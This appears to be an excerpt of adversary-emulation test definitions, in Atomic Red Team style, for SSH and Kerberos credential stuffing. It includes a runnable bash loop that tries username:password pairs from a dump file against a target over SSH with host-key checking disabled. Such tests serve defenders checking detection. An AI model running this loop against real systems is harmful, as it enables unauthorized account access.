atomic_tests.name: SSH Credential Stuffing From Linux
atomic_tests.description: Using username,password combination from a password dump to login over SSH.

executor.name: bash
executor.procedure:
cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done

input_arguments.description: IP Address / Hostname you want to target.

dependencies.prereq_command: if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
dependencies.get_prereq_command: if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo "This test requires sshpass" ; fi ;

atomic_tests.name: Brute Force:Credential Stuffing using Kerbrute Tool
atomic_tests.description: Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack

input_arguments.description: Domain controller where test will be run
Domain where you will be testing
